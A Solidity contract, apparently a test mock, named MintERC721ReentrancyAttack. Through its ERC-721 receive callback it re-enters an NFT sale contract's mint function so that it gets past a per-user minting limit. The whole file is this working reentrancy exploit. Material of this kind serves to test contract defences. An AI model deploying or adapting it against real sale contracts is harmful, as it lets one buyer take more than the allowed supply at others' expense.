//SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IContract  {
    function mint(uint256 amount) external payable;
}

contract MintERC721ReentrancyAttack is Ownable, IERC721Receiver {
    address public saleContract;
    uint256 public MAX_PER_USER = 20;
    uint256 public isCall = 0;

    constructor() {
    }

    function mint() public payable {
        IContract(saleContract).mint(MAX_PER_USER);
    }

    function setContract(address _contract) public onlyOwner {
        saleContract = _contract;
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public override returns (bytes4) {
        if (isCall == 0) {
            isCall = 1;
            IContract(saleContract).mint(MAX_PER_USER - 1);
        }

        return this.onERC721Received.selector;
    }

    receive() external payable {}
    fallback() external payable {}
}